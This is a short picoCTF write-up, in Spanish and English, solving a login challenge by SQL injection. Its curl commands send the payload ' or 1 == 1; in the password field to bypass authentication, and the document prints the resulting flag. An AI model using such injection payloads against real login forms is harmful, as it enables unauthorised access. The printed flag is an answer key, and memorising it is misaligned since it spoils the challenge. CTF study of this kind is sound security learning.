# Reto
# Descripción

Do you think you can log us in? Try to see if you can login! http://fickle-tempest.picoctf.net:54515.
# Solución

```  
picoCTF{s0m3_SQL_85832275}
```


``` 
┌──(kali㉿kali)-[~]
└─$ curl -s http://fickle-tempest.picoctf.net:56497/login.php -d "username= admin&password=password&debug=1"
<pre>username:  admin
password: password
SQL query: SELECT * FROM users WHERE name=' admin' AND password='password'
</pre><h1>Login failed.</h1>                                                                                                        
┌──(kali㉿kali)-[~]
└─$ curl -s http://fickle-tempest.picoctf.net:56497/login.php -d "username= admin&password=' or 1 == 1;&debug=1"
<pre>username:  admin
password: ' or 1 == 1;
SQL query: SELECT * FROM users WHERE name=' admin' AND password='' or 1 == 1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_85832275}</p>                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 


 
' or 1 == 1;
```

# Notas adicionales

Inyecciones SQL, en ciertos logins puedo hacer un ataque sql de inyección

# Referencias

